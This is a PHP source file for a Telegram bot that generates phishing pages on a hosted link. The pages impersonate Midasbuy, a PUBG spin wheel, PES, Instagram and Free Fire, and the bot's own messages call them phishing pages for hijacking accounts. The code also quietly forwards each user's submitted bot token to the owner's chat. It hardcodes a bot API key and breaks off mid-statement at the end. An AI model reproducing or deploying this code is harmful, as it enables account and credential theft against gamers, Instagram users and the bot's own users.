<?php
$SPAM = "5745269780:AAHKcgK6hcKpBlkDHfdW4qQvfXc-nAm5v9g";
define('API_KEY',"$SPAM");
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$text = $message->text; 
$data = $update->callback_query->data; 
$user = $update->message->from->username; 
$user2 = $update->callback_query->from->username;
$message_id = $message->message_id;
$message_id2 = $update->callback_query->message->message_id; 
$chat_id = $message->chat->id; 
$chat_id2 = $update->callback_query->message->chat->id; 
$from_id = $message->from->id;
$from_id2 = $update->callback_query->message->from->id; 
$type = $update->message->chat->type; 
$name = $message->from->first_name.$message->from->last_name;

#مسار الاندكسات#
$midasbuy = ("midas10.zip"); #مسار اندكس ال𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬
$spin = ("spinnns.zip"); #مسار اندكس عجلة الحظ
$pes = ("pes.zip"); #مسار اندكس بيس
$insta = ("wahuminsta.zip"); #مسار اندكس الانستا
$freefire = ("freefire.zip"); #مسار اندكس 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘

#صور الاندكسات#
$midasbuyphoto = ("https://t.me/DDH_I/78"); #Resim اندكس ال𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬
$spinphoto = ("https://t.me/ksamk4994/14"); #Resim اندكس عجبة الحظ
$pesphoto = ("https://t.me/DDH_I/15"); #Resim اندكس بيس
$instaphoto = ("https://t.me/DDH_I/11"); #Resim اندكس الانستا
$freefirephoto = ("https://t.me/DDH_I/13"); #Resim اندكس 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘
$link = "https://google.midasforce.repl.co"; #رابط الاستضافة

#التخزين#
mkdir("database-links");
mkdir("indexdata");
$sudo = 5483519544; #ايدي صاحب البوت

#الاشتراك الاجباري#
$fox_iq = "O7MAZENN"; #معرف القناة بدون @
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$fox_iq&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"👋 • Hoşgeldin canım $name ، 🖤
🚫 • Üzgünüz, botu kullanamazsınız ، ♨️
🚸 • Bot kanalına abone olun ve gönderin /Verify ، 🛠️
🧸 • Botun Kanalı @$fox_iq ، 🖇️
",'reply_to_message_id'=>$message->message_id,
]);return false;}

if($text == "/start"  or $text == "/Verify" or $text == "🔙" or $text == "🏕️ • Referanslar ، 🏝️"){
#تخزين الداتا - يرجى عدم العبث بالكود#
file_put_contents("data/$from_id","$from_id-Real ID = ✅");
#تخزين الداتا - يرجى عدم العبث بالكود#
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/5",
'caption'=>
"🙋🏻‍♂️ ، Hoşgeldin $name , 👋
➖➖➖➖➖➖➖➖➖➖➖➖
(💥) ، Bu bot, ücretsiz olarak (VIP) dizinleri oluşturur , 🤯
➖➖➖➖➖➖➖➖➖➖➖➖
(🤔) [ Nasıl Kullanılırım ? ](https://t.me/O7MAZENN/27)
➖➖➖➖➖➖➖➖➖➖➖➖
(🦅) Mazenn Hesap Düşürme Botu !
(🔵) Bot Versiyon :- v3.0
➖➖➖➖➖➖➖➖➖➖➖➖
      🎁 PUBG MOBILE 🎁
➖➖➖➖➖➖➖➖➖➖➖➖
(📲 ) [ Mazen Kanala Katılın 🏙️ ](https://t.me/O7MAZENN)
➖➖➖➖➖➖➖➖➖➖➖➖
🧭 ، Aşağıdaki düğmeler arasında gezinin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔗 • Hesap Linki Oluştur , 📲',],['text'=>'🗑️ • Hesap Linki Sil , 🗂️️',]],
[['text'=>'🖇️ • Hesap Linklerim , 🗂️️️',]],[['text'=>'🎋 • Promosyon Hizmetleri , 🎠',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$from_id");
}
if($text == '🔗 • Hesap Linki Oluştur , 📲' or $text == "ɢᴇʀɪ ᴅᴏ̈ɴ , 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🧭 • Hoşgeldin canım $name , 👋
🎪 • Bu bölüm dizin oluşturmak içindir , 〽️
🪐 • Botun çalışması için dizini seçin , 🎯
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'👾 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🎯',],['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🗑️ • Hesap Linki Sil , 🗂️️' or $text == "• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • Hoşgeldin canım $name , 👋
⚠️ • Bu bölüm dizinleri silmek içindir ، 📛
🚸 • Aşağıdaki klavyeden silmek istediğiniz dizinleri seçin ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🏝️',],['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == "🎠 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🏝️" or $text == "• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"🧭 • Hoşgeldin canım $name , 👋
🎠 • Aşağıdan dizin türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 ، 💸',],['text'=>'🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 ، 🧨',]],
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == '🖇️ • Hesap Linklerim , 🗂️️️' or $text == "• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • Hoşgeldin canım $name , 👋
🎯 • Bağlantıyı almak için dizin türünü seçin , ⚠️
🎪 • Aşağıdaki klavyeyi kullanın , 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🪐 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 👾',],['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == "🪐 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 👾" or $text == "• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"🧭 • Hoşgeldin canım $name , 👋
🎠 • Aşağıdan dizin türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'💸 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🏝️',],['text'=>'🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 , 🀄',]],
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == "👾 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🎯" or $text == "ɢᴇʀɪ ᴅᴏ̈ɴ 🔙"){
file_put_contents("data/$from_id","$from_id-Real ID = $database");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"👋 • Hoşgeldin canım $name , 🏹
👾 • Bu bölüm dizin oluşturmak içindir 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🪐
🏝️ • Aşağıdaki klavyeden dizin türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎪 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🪔',],['text'=>'🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 , 🎠',]],
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ , 🔙',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$from_id");
}
$makeSpin = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeSpin == "spin"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-spin");
mkdir("pubg");
mkdir("pubg/$from_id");
mkdir("pubg/$from_id/s");
mkdir("database-links/$from_id");
file_put_contents("pubg/$from_id/s/token","$text");
file_put_contents("pubg/$from_id/s/id","$chat_id");
file_put_contents("database-links/$from_id/spin","link-spin-done");
$zip = new ZipArchive;
if ($zip->open("$spin") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$from_id/s");
    $zip->close();
    
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Hesap Düşürme başarıyla oluşturuldu ، 🪔
➖➖➖➖➖➖➖➖➖➖
🎪 • Düşecek Hesap Bot Kimliğiniz ، 🀄
    👉 @$userr 👈
➖➖➖➖➖➖➖➖➖➖
🖇️ • Hesap Düşürme Bağlantınız ، 👇
$link/pubg/$from_id/m/index.php
➖➖➖➖➖➖➖➖➖➖
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Seçtiği Marka - $from_id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeMidasBuy = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeMidasBuy == "midasbuy"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-midasbuy");
mkdir("pubg");
mkdir("pubg/$from_id");
mkdir("pubg/$from_id/m");
mkdir("database-links/$from_id");
file_put_contents("pubg/$from_id/m/token","$text");
file_put_contents("pubg/$from_id/m/id","$chat_id");
file_put_contents("database-links/$from_id/midasbuy","link-midasbuy-done");
$zip = new ZipArchive;
if ($zip->open("$midasbuy") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$from_id/m");
    $zip->close();
    
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Hesap Düşürme başarıyla oluşturuldu ، 🪔
➖➖➖➖➖➖➖➖➖➖
🎪 • Düşecek Hesap Bot Kimliğiniz ، 🀄
    👉 @$userr 👈
➖➖➖➖➖➖➖➖➖➖
🖇️ • Hesap Düşürme Bağlantınız ، 👇
$link/pubg/$from_id/m/index.php
➖➖➖➖➖➖➖➖➖➖
",
]);
}

bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Seçtiği Marka - $from_id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makePes = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makePes == "pes"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-pes");
mkdir("pes");
mkdir("pes/$from_id");
mkdir("database-links/$from_id");
file_put_contents("pes/$from_id/token","$text");
file_put_contents("pes/$from_id/id","$chat_id");
file_put_contents("database-links/$from_id/pes","link-pes-done");
$zip = new ZipArchive;
if ($zip->open("$pes") === TRUE) {
    $zip->extractTo(__DIR__."/"."pes/$from_id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Dizin başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr
🖇️ • Dizin Bağlantınız ، 👇
$link/pes/$from_id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Seçtiği Marka - $from_id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeFreeFire = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeINsta == "freefire"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-freefire");
mkdir("freefire");
mkdir("freefire/$from_id");
mkdir("database-links/$from_id");
file_put_contents("freefire/$from_id/token","$text");
file_put_contents("freefire/$from_id/id","$chat_id");
file_put_contents("database-links/$from_id/freefire","link-freefire-done");
$zip = new ZipArchive;
if ($zip->open("$freefire") === TRUE) {
    $zip->extractTo(__DIR__."/"."freefire/$from_id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Dizin başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr
🖇️ • Dizin Bağlantınız ، 👇
$link/freefire/$from_id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Seçtiği Marka - $from_id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeINsta = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeINsta == "insta"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-insta");
mkdir("insta");
mkdir("insta/$from_id");
mkdir("database-links/$from_id");
file_put_contents("insta/$from_id/token","$text");
file_put_contents("insta/$from_id/id","$chat_id");
file_put_contents("database-links/$from_id/insta","link-insta-done");
$zip = new ZipArchive;
if ($zip->open("$insta") === TRUE) {
    $zip->extractTo(__DIR__."/"."insta/$from_id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Dizin başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr
🖇️ • Dizin Bağlantınız ، 👇
$link/insta/$from_id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Seçtiği Marka - $from_id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

if($text == '🎪 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🪔' and !file_exists("pubg/$from_id/m/index.php")){ 
file_put_contents("indexdata/$from_id", "midasbuy");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midasbuyphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🪔' and file_exists("pubg/$from_id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 , 🎠' and !file_exists("pubg/$from_id/s/index.php")){ 
file_put_contents("indexdata/$from_id", "spin");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$spinphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 , 🎠' and file_exists("pubg/$from_id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗣𝗘𝗦 𝗠𝗢𝗕𝗜𝗟𝗘 , ⚽' and !file_exists("pes/$from_id/index.php")){ 
file_put_contents("indexdata/$from_id", "pes");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$pesphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗣𝗘𝗦 𝗠𝗢𝗕𝗜𝗟𝗘 , ⚽' and file_exists("pes/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 , 🧸' and !file_exists("insta/$from_id/index.php")){ 
file_put_contents("indexdata/$from_id", "insta");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$instaphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 , 🧸' and file_exists("insta/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 , 🀄' and !file_exists("freefire/$from_id/index.php")){ 
file_put_contents("indexdata/$from_id", "freefire");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$freefirephoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 , 🀄' and file_exists("freefire/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

$link_midasbuy = file_get_contents("database-links/$from_id/midasbuy");
if($text == '💸 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🏝️' and $link_midasbuy == "link-midasbuy-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/pubg/$from_id/m/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '💸 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🏝️' and !file_exists("pubg/$from_id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]]
],'resize_keyboard'=>true])]);}

$link_spin = file_get_contents("database-links/$from_id/spin");
if($text == '🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 , 🀄' and $link_spin == "link-spin-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/pubg/$from_id/s/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 , 🀄' and !file_exists("pubg/$from_id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]]
],'resize_keyboard'=>true])]);}

$link_pes = file_get_contents("database-links/$from_id/pes");
if($text == '⚽ • 𝗣𝗘𝗦 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🪔' and $link_pes == "link-pes-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/pes/$from_id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '⚽ • 𝗣𝗘𝗦 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🪔' and !file_exists("pes/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]]
],'resize_keyboard'=>true])]);}

$link_insta = file_get_contents("database-links/$from_id/insta");
if($text == '🎪 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🏹' and $link_insta == "link-insta-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/insta/$from_id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🏹' and !file_exists("insta/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]]
],'resize_keyboard'=>true])]);}

$link_freefire = file_get_contents("database-links/$from_id/freefire");
if($text == '🏝️ • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🎠' and $link_freefire == "link-freefire-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/freefire/$from_id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🎠' and !file_exists("freefire/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎠 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 ، 💸' and !file_exists("pubg/$from_id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎠 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 ، 💸' and file_exists("pubg/$from_id/m/index.php")){ 
$delete = 8; 
